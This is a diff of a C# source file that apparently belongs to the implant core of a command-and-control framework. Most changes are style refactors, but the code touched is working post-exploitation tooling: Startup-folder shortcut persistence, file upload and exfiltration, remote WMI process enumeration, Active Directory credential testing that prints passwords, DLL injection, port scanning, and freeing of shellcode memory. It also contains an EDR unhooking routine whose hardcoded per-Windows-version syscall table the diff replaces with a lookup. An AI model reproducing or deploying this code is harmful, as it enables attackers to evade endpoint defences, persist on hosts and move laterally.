@@ -344,7 +344,7 @@ namespace Core
                     if (assembly.FullName.ToLower().StartsWith(assemblyName.ToLower()))
                     {
                         Console.WriteLine(assemblyName);
-                        var type = Utils.LoadAssembly($"{typeName}, " + assembly.FullName);
+                        var type = Utils.LoadAssembly($"{typeName}, {assembly.FullName}");
                         var methods = type.GetMethods();
                         Console.WriteLine($"The methods of the {assemblyName} class are:\n");
                         foreach (var method in methods)
@@ -383,7 +383,7 @@ namespace Core
         {
             try
             {
-                var splitArgs = args[1].Split(new[] {";"}, StringSplitOptions.RemoveEmptyEntries);
+                var splitArgs = args[1].Split(new[] { ";" }, StringSplitOptions.RemoveEmptyEntries);
                 var fileBytes = Convert.FromBase64String(splitArgs[0]);
                 System.IO.File.WriteAllBytes(splitArgs[1].Replace("\"", ""), fileBytes);
                 Console.WriteLine($"Uploaded file to: {splitArgs[1]}");
@@ -403,7 +403,7 @@ namespace Core
                 var fileName = args[1];
                 var chunkSize = 50737418;
                 var fileSize = new FileInfo(fileName).Length;
-                var totalChunks = Math.Ceiling((double) fileSize / chunkSize);
+                var totalChunks = Math.Ceiling((double)fileSize / chunkSize);
                 if (totalChunks < 1)
                 {
                     totalChunks = 1;
@@ -477,7 +477,7 @@ namespace Core
                 var taskIdstr = lTyp.GetType("Program").GetField("taskId").GetValue(null);
                 pwnr.taskid = $"{taskIdstr}-pwrstatusmsg";
                 var m = t.GetMethod("CreatePwrFrmAsync");
-                m.Invoke(null, new object[] {pwnr});
+                m.Invoke(null, new object[] { pwnr });
             }
             catch (NullReferenceException)
             {
@@ -509,7 +509,7 @@ namespace Core
             try
             {
                 int proc = int.Parse(args[1]);
-                string hostname = args[2]; 
+                string hostname = args[2];
 
                 Console.WriteLine("[+] Process ID: {0}", proc);
                 Console.WriteLine("[+] Computer: {0}", hostname);
@@ -548,7 +548,7 @@ namespace Core
             var type = assembly.GetType("PortScanner_Dll.Scanner.TCPConnectScanner");
 
             Activator.CreateInstance(type);
-            object[] argObj = {args[1], args[2], iDelay, iThreads, false, true, -1, false};
+            object[] argObj = { args[1], args[2], iDelay, iThreads, false, true, -1, false };
             var m = type.GetMethod("PerformTCPConnectScan");
 
             var x = type.GetProperty("VisualResults");
@@ -595,7 +595,7 @@ namespace Core
         {
             try
             {
-                var process = new Process {StartInfo = {UseShellExecute = false}};
+                var process = new Process { StartInfo = { UseShellExecute = false } };
                 process.StartInfo.RedirectStandardOutput = process.StartInfo.RedirectStandardError = process.StartInfo.CreateNoWindow = true;
                 process.StartInfo.FileName = args[1];
                 if (args.Length > 2)
@@ -620,7 +620,7 @@ namespace Core
         {
             try
             {
-                var process = new Process {StartInfo = {UseShellExecute = false}};
+                var process = new Process { StartInfo = { UseShellExecute = false } };
                 process.StartInfo.RedirectStandardOutput = process.StartInfo.RedirectStandardError = process.StartInfo.CreateNoWindow = true;
                 process.StartInfo.FileName = args[1];
 
@@ -669,9 +669,9 @@ namespace Core
                     {
                         var tLoc = args[1].Replace("\"", "");
                         var shell = new WshShell();
-                        var shortcut = (IWshShortcut) shell.CreateShortcut(tLoc);
-                        shortcut.Arguments = @"" + args[3].Replace("\"", "");
-                        shortcut.TargetPath = @"" + args[2].Replace("\"", "");
+                        var shortcut = (IWshShortcut)shell.CreateShortcut(tLoc);
+                        shortcut.Arguments = $@"{args[3].Replace("\"", "")}";
+                        shortcut.TargetPath = $@"{args[2].Replace("\"", "")}";
                         shortcut.Save();
                         Console.WriteLine("Written shortcut file:");
                         Console.WriteLine($"[+] {tLoc}");
@@ -688,7 +688,7 @@ namespace Core
                     {
                         var tLoc = args[1].Replace("\"", "");
                         var shell = new WshShell();
-                        var shortcut = (IWshShortcut) shell.CreateShortcut(tLoc);
+                        var shortcut = (IWshShortcut)shell.CreateShortcut(tLoc);
                         shortcut.Arguments = @"";
                         shortcut.TargetPath = args[2].Replace("\"", "");
                         shortcut.Save();
@@ -722,27 +722,27 @@ namespace Core
                 else if (args.Length == 4)
                 {
                     var userName = Environment.UserName;
-                    var tLoc = @"C:\Users\" + userName + @"\appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" + args[1];
+                    var tLoc = $@"C:\Users\{userName}\appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{args[1]}";
                     Console.WriteLine("Written shortcut file:");
                     Console.WriteLine($"[+] {tLoc}");
                     Console.WriteLine($"[+] {args[2]} {args[3]}");
                     var shell = new WshShell();
-                    var shortcut = (IWshShortcut) shell.CreateShortcut(tLoc);
-                    shortcut.Arguments = @"" + args[3];
-                    shortcut.TargetPath = @"" + args[2];
+                    var shortcut = (IWshShortcut)shell.CreateShortcut(tLoc);
+                    shortcut.Arguments = $@"{args[3]}";
+                    shortcut.TargetPath = $@"{args[2]}";
                     shortcut.Save();
                 }
                 else if (args.Length == 3)
                 {
                     var userName = Environment.UserName;
-                    var tLoc = @"C:\Users\" + userName + @"\appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" + args[1];
+                    var tLoc = $@"C:\Users\{userName}\appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{args[1]}";
                     Console.WriteLine("Written shortcut file:");
                     Console.WriteLine($"[+] {tLoc}");
                     Console.WriteLine($"[+] {args[2]}");
                     var shell = new WshShell();
-                    var shortcut = (IWshShortcut) shell.CreateShortcut(tLoc);
+                    var shortcut = (IWshShortcut)shell.CreateShortcut(tLoc);
                     shortcut.Arguments = @"";
-                    shortcut.TargetPath = @"" + args[2];
+                    shortcut.TargetPath = $@"{args[2]}";
                     shortcut.Save();
                 }
             }
@@ -801,8 +801,8 @@ namespace Core
         {
             try
             {
-                var sourceFileName = @"" + args[1].Replace("\"", "");
-                var destFileName = @"" + args[2].Replace("\"", "");
+                var sourceFileName = $@"{args[1].Replace("\"", "")}";
+                var destFileName = $@"{args[2].Replace("\"", "")}";
 
                 if (System.IO.File.Exists(destFileName))
                 {
@@ -824,8 +824,8 @@ namespace Core
         {
             try
             {
-                var sourceFileName = @"" + args[1].Replace("\"", "");
-                var destFileName = @"" + args[2].Replace("\"", "");
+                var sourceFileName = $@"{args[1].Replace("\"", "")}";
+                var destFileName = $@"{args[2].Replace("\"", "")}";
 
                 if (System.IO.File.Exists(sourceFileName))
                 {
@@ -894,14 +894,14 @@ namespace Core
             try
             {
                 Console.WriteLine("[+] Deleting file:\n");
-                if (!System.IO.File.Exists(@"" + args[1].Replace("\"", "")))
+                if (!System.IO.File.Exists($@"{args[1].Replace("\"", "")}"))
                 {
                     Console.WriteLine($"[-] Could not find file: {args[1]}");
                 }
                 else
                 {
-                    System.IO.File.Delete(@"" + args[1].Replace("\"", ""));
-                    if (System.IO.File.Exists(@"" + args[1].Replace("\"", "")))
+                    System.IO.File.Delete($@"{args[1].Replace("\"", "")}");
+                    if (System.IO.File.Exists($@"{args[1].Replace("\"", "")}"))
                     {
                         Console.WriteLine($"[-] Could not delete file: {args[1]}");
                     }
@@ -917,12 +917,13 @@ namespace Core
             }
         }
 
-        [CoreDispatch(Description = "Used for checking a specific process on a remote host using WMI", Usage = "Usage: get-remoteprocesslisting HOSTNAME1,HOSTNAME2 [explorer.exe] [Username] [Domain] [Password]")]
+        [CoreDispatch(Description = "Used for checking a specific process on a remote host using WMI",
+            Usage = "Usage: get-remoteprocesslisting HOSTNAME1,HOSTNAME2 [explorer.exe] [Username] [Domain] [Password]")]
         public static void GetRemoteProcessListing(string[] args)
         {
             try
             {
-                if (args.Length < 2 || args.Length > 6 )
+                if (args.Length < 2 || args.Length > 6)
                 {
                     Console.WriteLine("[!] Invalid number of arguments.");
                     Console.WriteLine("[!] Usage: get-remoteprocesslisting HOSTNAME1,HOSTNAME2 [explorer.exe] [Username] [Domain] [Password]");
@@ -959,6 +960,7 @@ namespace Core
                         Console.WriteLine("[!] Invalid number of arguments.");
                         Console.WriteLine("[!] Usage: get-remoteprocesslisting HOSTNAME1,HOSTNAME2 [explorer.exe] [Username] [Domain] [Password]");
                     }
+
                     var tasks = new List<Task>();
 
                     var computerList = machineNameArg.Split(',').ToList();
@@ -970,9 +972,7 @@ namespace Core
                     });
 
                     Task.WaitAll(tasks.ToArray());
-
                 }
-                
             }
             catch (Exception e)
             {
@@ -1007,13 +1007,13 @@ namespace Core
             try
             {
                 Console.WriteLine("[+] Deleting file:\n");
-                if (!System.IO.File.Exists(@"" + args[1].Replace("\"", "")))
+                if (!System.IO.File.Exists($@"{args[1].Replace("\"", "")}"))
                 {
                     Console.WriteLine($"[-] Could not find file: {args[1]}");
                 }
                 else
                 {
-                    var filename = @"" + args[1].Replace("\"", "");
+                    var filename = $@"{args[1].Replace("\"", "")}";
                     try
                     {
                         if (System.IO.File.Exists(filename))
@@ -1152,7 +1152,7 @@ namespace Core
         {
             try
             {
-                var bytesRead = System.IO.File.ReadAllBytes(@"" + args[1].Replace("\"", ""));
+                var bytesRead = System.IO.File.ReadAllBytes($@"{args[1].Replace("\"", "")}");
                 Console.WriteLine(Encoding.UTF8.GetString(bytesRead));
             }
             catch (Exception e)
@@ -1194,12 +1194,12 @@ namespace Core
                 if (success)
                 {
                     Console.WriteLine("[+] Test AD Credentials - Success");
-                    Console.WriteLine("[+] Username: " + domain + "\\" + username + "\r\n[+] Password: " + password);
+                    Console.WriteLine($"[+] Username: {domain}\\{username}\r\n[+] Password: {password}");
                 }
                 else
                 {
                     Console.WriteLine("[-] Test AD Credentials - Failure");
-                    Console.WriteLine("[-] Username: " + domain + "\\" + username + "\r\n[-] Password: " + password);
+                    Console.WriteLine($"[-] Username: {domain}\\{username}\r\n[-] Password: {password}");
                 }
             }
             catch (Exception e)
@@ -1227,12 +1227,12 @@ namespace Core
                 if (success)
                 {
                     Console.WriteLine("[+] Test Credentials - Success");
-                    Console.WriteLine("[+] Username: " + username + "\r\n[+] Password: " + password);
+                    Console.WriteLine($"[+] Username: {username}\r\n[+] Password: {password}");
                 }
                 else
                 {
                     Console.WriteLine("[-] Test Credentials - Failure");
-                    Console.WriteLine("[-] Username: " + username + "\r\n[-] Password: " + password);
+                    Console.WriteLine($"[-] Username: {username}\r\n[-] Password: {password}");
                 }
             }
             catch (Exception e)
@@ -1327,7 +1327,7 @@ namespace Core
                 }
                 else
                 {
-                    username = Environment.UserDomainName + "\\" + Environment.UserName;
+                    username = $"{Environment.UserDomainName}\\{Environment.UserName}";
                 }
 
                 if (Environment.OSVersion.Version.Major == 10)
@@ -1499,692 +1499,24 @@ namespace Core
             Injection.Injection.InjectDLL(args);
         }
 
-        [CoreDispatch(Description = "Attempts to unhook various system calls in the current process, Win10 only", Usage = "Usage: unhooker")]
+        [CoreDispatch(Description = "Attempts to unhook various system calls in the current process", Usage = "Usage: unhooker")]
         public static void Unhooker()
         {
-            var wver = "";
-            var cver = "";
-            try
-            {
-                wver = ProcessHandler.Hook.GetWinVer();
-                cver = ProcessHandler.Hook.GetCurrentVer();
-                ProcessHandler.Hook.GetProductName();
-            }
-            catch
-            {
-            }
-
-            var osVersionInfo = new Internals.OSVersionInfoExW {dwOSVersionInfoSize = Marshal.SizeOf(typeof(Internals.OSVersionInfoExW))};
-            Internals.RtlGetVersion(ref osVersionInfo);
-
-            GetOSVersion();
             Console.WriteLine("\nUnhooking 64bit process");
             Console.WriteLine("==============================================================");
-
-            byte scZwCreateThreadEx = 0x00;
-            byte zwCreateUserProcess = 0x00;
-            byte zwCreateProcess = 0x00;
-            byte scNtAllocateVirtualMemory = 0x00;
-            string output = null;
-
-            if (osVersionInfo.dwBuildNumber == 19042 || osVersionInfo.dwBuildNumber == 19041)
-            {
-                Console.WriteLine("2004 & 20H2");
-            } // 2004 & 20H2
-
-            // setting the syscall id for ZwCreateProcess
-            if (wver == "1507")
-            {
-                zwCreateProcess = 0xad;
-            }
-
-            if (wver == "1511")
-            {
-                zwCreateProcess = 0xaa;
-            }
-
-            if (wver == "1607")
-            {
-                zwCreateProcess = 0xaf;
-            }
-
-            if (wver == "1703")
-            {
-                zwCreateProcess = 0xb2;
-            }
-
-            if (wver == "1709")
-            {
-                zwCreateProcess = 0xb3;
-            }
-
-            if (wver == "1803")
-            {
-                zwCreateProcess = 0xb4;
-            }
-
-            if (wver == "1809")
-            {
-                zwCreateProcess = 0xb4;
-            }
-
-            if (wver == "1903")
-            {
-                zwCreateProcess = 0xb5;
-            }
-
-            if (wver == "1909")
-            {
-                zwCreateProcess = 0xb5;
-            }
-
-            if (osVersionInfo.dwBuildNumber == 19042 || osVersionInfo.dwBuildNumber == 19041)
-            {
-                zwCreateProcess = 0xb9;
-            } // 2004 & 20H2
-
-            // setting the syscall id for ZwCreateUserProcess
-            if (wver == "1507")
-            {
-                zwCreateUserProcess = 0xba;
-            }
-
-            if (wver == "1511")
-            {
-                zwCreateUserProcess = 0xbb;
-            }
-
-            if (wver == "1607")
-            {
-                zwCreateUserProcess = 0xbd;
-            }
-
-            if (wver == "1703")
-            {
-                zwCreateUserProcess = 0xc0;
-            }
-
-            if (wver == "1709")
-            {
-                zwCreateUserProcess = 0xc1;
-            }
-
-            if (wver == "1803")
-            {
-                zwCreateUserProcess = 0xc2;
-            }
-
-            if (wver == "1809")
-            {
-                zwCreateUserProcess = 0xc3;
-            }
-
-            if (wver == "1903")
-            {
-                zwCreateUserProcess = 0xc4;
-            }
-
-            if (wver == "1909")
-            {
-                zwCreateUserProcess = 0xc4;
-            }
-
-            if (osVersionInfo.dwBuildNumber == 19042 || osVersionInfo.dwBuildNumber == 19041)
-            {
-                zwCreateUserProcess = 0xc8;
-            } // 2004 & 20H2
-
-            // setting the syscall id for NtQueueApcThreadEx
-            if (wver == "1507")
-            {
-            }
-
-            if (wver == "1511")
-            {
-            }
-
-            if (wver == "1607")
-            {
-            }
-
-            if (wver == "1703")
-            {
-            }
-
-            if (wver == "1709")
-            {
-            }
-
-            if (wver == "1803")
-            {
-            }
-
-            if (wver == "1809")
-            {
-            }
-
-            if (wver == "1903")
-            {
-            }
-
-            if (wver == "1909")
-            {
-            }
-
-            if (osVersionInfo.dwBuildNumber == 19042 || osVersionInfo.dwBuildNumber == 19041)
-            {
-            } // 2004 & 20H2
-
-            // setting the syscall id for ZwCreateThreadEx            
-            if (wver == "1507")
-            {
-                scZwCreateThreadEx = 0xb3;
-            }
-
-            if (wver == "1511")
-            {
-                scZwCreateThreadEx = 0xb4;
-            }
-
-            if (wver == "1607")
-            {
-                scZwCreateThreadEx = 0xb6;
-            }
-
-            if (wver == "1703")
-            {
-                scZwCreateThreadEx = 0xb9;
-            }
-
-            if (wver == "1709")
-            {
-                scZwCreateThreadEx = 0xba;
-            }
-
-            if (wver == "1803")
-            {
-                scZwCreateThreadEx = 0xbb;
-            }
-
-            if (wver == "1809")
-            {
-                scZwCreateThreadEx = 0xbc;
-            }
-
-            if (wver == "1903")
-            {
-                scZwCreateThreadEx = 0xbd;
-            }
-
-            if (wver == "1909")
-            {
-                scZwCreateThreadEx = 0xbd;
-            }
-
-            if (osVersionInfo.dwBuildNumber == 19042 || osVersionInfo.dwBuildNumber == 19041)
-            {
-                scZwCreateThreadEx = 0xc1;
-            } // 2004 & 20H2
-
-            // setting the syscall id for NtAllocateVirtualMemory            
-            if (wver == "1507")
-            {
-                scNtAllocateVirtualMemory = 0x18;
-            }
-
-            if (wver == "1511")
-            {
-                scNtAllocateVirtualMemory = 0x18;
-            }
-
-            if (wver == "1607")
-            {
-                scNtAllocateVirtualMemory = 0x18;
-            }
-
-            if (wver == "1703")
-            {
-                scNtAllocateVirtualMemory = 0x18;
-            }
-
-            if (wver == "1709")
-            {
-                scNtAllocateVirtualMemory = 0x18;
-            }
-
-            if (wver == "1803")
-            {
-                scNtAllocateVirtualMemory = 0x18;
-            }
-
-            if (wver == "1809")
-            {
-                scNtAllocateVirtualMemory = 0x18;
-            }
-
-            if (wver == "1903")
-            {
-                scNtAllocateVirtualMemory = 0x18;
-            }
-
-            if (wver == "1909")
-            {
-                scNtAllocateVirtualMemory = 0x18;
-            }
-
-            if (osVersionInfo.dwBuildNumber == 19042 || osVersionInfo.dwBuildNumber == 19041)
-            {
-                scNtAllocateVirtualMemory = 0x18;
-            } // 2004 & 20H2
-
-            if (cver == "6.1")
-            {
-                // if Windows 7 SP1
-                scZwCreateThreadEx = 0xa5;
-                try
-                {
-                    output += ProcessHandler.Hook.UHookVMemory(0x15);
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHookRMemory(0x3c);
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHookWMemory(0x37);
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHookOProcess(0x23);
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHookMvSection(0x25);
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHook(scZwCreateThreadEx);
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHooker(0x4b, "ZwCreateThread");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHooker(0x27, "NtUnmapViewOfSection");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHooker(0xaa, "ZwCreateUserProcess");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHooker(0x9f, "ZwCreateProcess");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHooker(0x4a, "NtCreateProcessEx");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHooker(0x1b, "NtFreeVirtualMemory");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHooker(0x4d, "NtProtectVirtualMemory");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHooker(0x42, "ZwQueueApcThread");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-            }
-            else if (cver == "6.3" && string.IsNullOrEmpty(wver))
-            {
-                // if Windows 2012 R2
-                scZwCreateThreadEx = 0xb0;
-                try
-                {
-                    output += ProcessHandler.Hook.UHookVMemory(0x17);
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHookRMemory(0x3e);
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHookWMemory(0x39);
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHookOProcess(0x25);
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHookMvSection(0x27);
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHook(scZwCreateThreadEx);
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHooker(0x4d, "ZwCreateThread");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHooker(0x29, "NtUnmapViewOfSection");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHooker(0xb7, "ZwCreateUserProcess");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHooker(0xaa, "ZwCreateProcess");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHooker(0x4c, "NtCreateProcessEx");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHooker(0x1d, "NtFreeVirtualMemory");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHooker(0x4f, "NtProtectVirtualMemory");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHooker(0x44, "ZwQueueApcThread");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-            }
-            else
-            {
-                // if Windows 10 or Server 2016
-                try
-                {
-                    output += ProcessHandler.Hook.UHookVMemory();
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHookRMemory();
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHookWMemory();
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHookOProcess();
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHookMvSection();
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHooker(0x4e, "ZwCreateThread");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHooker(0x2a, "NtUnmapViewOfSection");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHooker(0x4d, "NtCreateProcessEx");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHooker(0x1e, "NtFreeVirtualMemory");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHooker(0x50, "NtProtectVirtualMemory");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHooker(0x45, "ZwQueueApcThread");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHook(scZwCreateThreadEx);
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHooker(zwCreateUserProcess, "ZwCreateUserProcess");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHooker(zwCreateProcess, "ZwCreateProcess");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-
-                try
-                {
-                    output += ProcessHandler.Hook.UHooker(scNtAllocateVirtualMemory, "NtAllocateVirtualMemory");
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e.Message);
-                }
-            }
-
-            //try {
-            //    output += ProcessHandler.Hook.RemoveDLL();
-            //}
-            //catch (Exception e)
-            //{
-            //    output += "Error free DLL + " + e.Message;
-            //}
-
-            Console.WriteLine(output);
+            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.ZwAllocateVirtualMemory), "ZwAllocateVirtualMemory");
+            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.ZwReadVirtualMemory), "ZwReadVirtualMemory");
+            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.NtWriteVirtualMemory), "NtWriteVirtualMemory");
+            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.NtOpenProcess), "NtOpenProcess");
+            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.ZwProtectVirtualMemory), "ZwProtectVirtualMemory");
+            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.ZwMapViewOfSection), "ZwMapViewOfSection");
+            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.NtCreateThreadEx), "NtCreateThreadEx");
+            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.NtCreateThread), "NtCreateThread");
+            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.NtUnmapViewOfSection), "NtUnmapViewOfSection");
+            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.NtCreateUserProcess), "NtCreateUserProcess");
+            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.NtCreateProcess), "NtCreateProcess");
+            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.ZwFreeVirtualMemory), "ZwFreeVirtualMemory");
+            ProcessHandler.Hook.UHooker(SysCall.GetOsVersionAndReturnSyscall(SysCall.SysCalls.NtQueueApcThread), "NtQueueApcThread");
         }
 
         [CoreDispatch(Description = "Gets the location of a API call", Usage = "Usage: get-apicall ntdll.dll NtQueueApcThreadEx")]
@@ -2197,7 +1529,7 @@ namespace Core
             }
             catch (Exception e)
             {
-                Console.WriteLine("[-] Cannot use Get-Get-APICall : " + e);
+                Console.WriteLine($"[-] Cannot use Get-Get-APICall : {e}");
             }
         }
 
@@ -2212,14 +1544,14 @@ namespace Core
                 }
                 else
                 {
-                    Console.WriteLine("[+] Running Get-ServicePerms " + args[1]);
-                    Host.ServicePerms.DumpServices(@"" + args[1].Replace("\"", ""));
+                    Console.WriteLine($"[+] Running Get-ServicePerms {args[1]}");
+                    Host.ServicePerms.DumpServices($@"{args[1].Replace("\"", "")}");
                     Console.WriteLine("");
                 }
             }
             catch (Exception e)
             {
-                Console.WriteLine("[-] Cannot Get-ServicePerms: " + e);
+                Console.WriteLine($"[-] Cannot Get-ServicePerms: {e}");
             }
         }
 
@@ -2255,7 +1587,7 @@ namespace Core
             }
             catch (Exception e)
             {
-                Console.WriteLine("[-] Error in SSLInspectionCheck: " + e);
+                Console.WriteLine($"[-] Error in SSLInspectionCheck: {e}");
             }
         }
 
@@ -2269,7 +1601,7 @@ namespace Core
             }
             catch (Exception e)
             {
-                Console.WriteLine("[-] Error in ProcessHandler: " + e);
+                Console.WriteLine($"[-] Error in ProcessHandler: {e}");
             }
         }
 
@@ -2287,7 +1619,7 @@ namespace Core
             }
             catch (Exception e)
             {
-                Console.WriteLine("[-] Error in ProcessHandler: " + e);
+                Console.WriteLine($"[-] Error in ProcessHandler: {e}");
             }
         }
 
@@ -2297,9 +1629,9 @@ namespace Core
             try
             {
                 var coreAssembly = AppDomain.CurrentDomain.GetAssemblies().LastOrDefault(assembly => assembly.GetName().Name == "dropper_cs");
-                var dllBaseAddress = (IntPtr) coreAssembly.GetType("Program").GetField("DllBaseAddress").GetValue(null);
+                var dllBaseAddress = (IntPtr)coreAssembly.GetType("Program").GetField("DllBaseAddress").GetValue(null);
                 Console.WriteLine($"[+] IntPtr BaseAddress from function executed via shellcode: 0x{dllBaseAddress.ToString("X")}");
-                var newDllBaseAddress = (long) dllBaseAddress & 0xFFFFF0000;
+                var newDllBaseAddress = (long)dllBaseAddress & 0xFFFFF0000;
                 Console.WriteLine($" > [+] Dll BaseAddress calculated in memory by bitwise arithmetic: 0x{newDllBaseAddress:X}");
                 Console.WriteLine($" > [+] Run FreeMemory 0x{newDllBaseAddress:X} to wipe and free memory page");
                 return newDllBaseAddress;
@@ -2316,12 +1648,12 @@ namespace Core
         {
             try
             {
-                Console.WriteLine("[>] Trying to free memory location: " + args[1]);
+                Console.WriteLine($"[>] Trying to free memory location: {args[1]}");
                 Console.WriteLine(ProcessHandler.Hook.FreeMemory(args[1]));
             }
             catch (Exception e)
             {
-                Console.WriteLine("[-] Error freeing memory location: " + e);
+                Console.WriteLine($"[-] Error freeing memory location: {e}");
             }
         }
 
@@ -2336,11 +1668,11 @@ namespace Core
                     return;
                 }
 
-                FreeMemory(new[] {null, $"0x{baseAddress:X}"});
+                FreeMemory(new[] { null, $"0x{baseAddress:X}" });
             }
             catch (Exception e)
             {
-                Console.WriteLine("[-] Error freeing memory location: " + e);
+                Console.WriteLine($"[-] Error freeing memory location: {e}");
             }
         }
 
@@ -2370,7 +1702,7 @@ namespace Core
             }
             catch (Exception e)
             {
-                Console.WriteLine("[-] Error trying to find file: " + e);
+                Console.WriteLine($"[-] Error trying to find file: {e}");
             }
         }
 
@@ -2385,7 +1717,7 @@ namespace Core
             }
             catch (Exception e)
             {
-                Console.WriteLine("[-] Error trying to run ls-reghkcu: " + e);
